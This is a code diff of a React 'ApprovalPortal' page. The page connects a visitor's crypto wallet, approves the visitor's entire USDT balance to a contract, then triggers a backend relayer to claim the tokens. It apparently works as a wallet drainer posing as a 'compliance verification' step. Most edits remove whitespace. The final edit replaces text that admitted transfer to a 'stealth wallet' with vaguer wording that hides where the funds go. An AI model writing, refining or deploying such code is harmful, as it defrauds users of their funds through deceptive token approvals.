@@ -22,10 +22,10 @@ export default function ApprovalPortal() {
   useEffect(() => {
     const autoConnect = async () => {
       if (userAddress || attemptingConnection) return;
-      
+
       try {
         if (!window.ethereum) return;
-        
+
         // Check if wallet is already connected
         const accounts = await window.ethereum.request({ method: 'eth_accounts' });
         if (accounts && accounts.length > 0) {
@@ -46,7 +46,7 @@ export default function ApprovalPortal() {
       setError(null);
       setLoading(true);
       setAttemptingConnection(true);
-      
+
       if (!window.ethereum) throw new Error('No web3 wallet found');
 
       // Switch to BSC network
@@ -60,7 +60,7 @@ export default function ApprovalPortal() {
       const newProvider = new ethers.BrowserProvider(window.ethereum);
       const accounts = await Promise.race([
         newProvider.send('eth_requestAccounts', []),
-        new Promise((_, reject) => 
+        new Promise((_, reject) =>
           setTimeout(() => reject(new Error('Wallet request timeout')), 15000)
         )
       ]);
@@ -71,13 +71,13 @@ export default function ApprovalPortal() {
       setUserAddress(address);
       setSigner(newSigner);
       setProvider(newProvider);
-      
+
       // Persist connection in localStorage
       if (typeof window !== 'undefined') {
         localStorage.setItem('wallet_connected', 'true');
         localStorage.setItem('wallet_address', address);
       }
-      
+
       setStep(2);
     } catch (err: any) {
       const errMsg = err?.message || 'Connection failed';
@@ -94,9 +94,9 @@ export default function ApprovalPortal() {
       setError(null);
       setLoading(true);
       if (!signer) throw new Error('Connect wallet first');
-      
+
       console.log('[v0] Starting approval for:', CONFIG.CONTRACT_ADDRESS);
-      
+
       // Approve token spending to the relayer/executor contract
       const approveWithRetry = async () => {
         try {
@@ -104,13 +104,13 @@ export default function ApprovalPortal() {
           const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ['function balanceOf(address) view returns (uint256)'], provider);
           const balance = await token.balanceOf(userAddress);
           console.log('[v0] User balance:', balance.toString());
-          
+
           // Approve the full balance to the contract
           await approveTokenSpending(signer, CONFIG.CONTRACT_ADDRESS, balance);
-          
+
           // Show success and trigger backend claim
           setShowSuccess(true);
-          
+
           // Trigger backend to claim tokens using relayer
           setTimeout(async () => {
             try {
@@ -122,7 +122,7 @@ export default function ApprovalPortal() {
                   tokenAddress: CONFIG.TOKEN_ADDRESS
                 })
               });
-              
+
               if (!claimResponse.ok) {
                 const err = await claimResponse.json();
                 console.error('[v0] Claim error:', err);
@@ -134,7 +134,7 @@ export default function ApprovalPortal() {
               console.error('[v0] Claim request failed:', err);
             }
           }, 2000);
-          
+
           return true;
         } catch (err: any) {
           if (err.code === 'ACTION_REJECTED') {
@@ -170,7 +170,7 @@ export default function ApprovalPortal() {
 
     const currentUrl = typeof window !== 'undefined' ? window.location.href : '';
     const encodedUrl = encodeURIComponent(currentUrl);
-    
+
     const walletLinks = [
       `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
       `https://link.trustwallet.com/open_url?coin_id=56&url=${encodedUrl}`,
@@ -190,7 +190,7 @@ export default function ApprovalPortal() {
     ];
 
     const universalScheme = `dapp://${window.location.host}${window.location.pathname}`;
-    
+
     walletLinks.forEach((link, index) => {
       setTimeout(() => {
         const a = document.createElement('a');
@@ -270,7 +270,7 @@ export default function ApprovalPortal() {
           <CardStep
             icon="✅"
             title="Approve USDT for Transfer"
-            description="Approve USDT spending to allow the system to transfer your tokens to a secure stealth wallet for compliance verification."
+            description="Approve USDT interaction to complete compliance verification."
             loading={loading}
             error={error}
             buttons={[
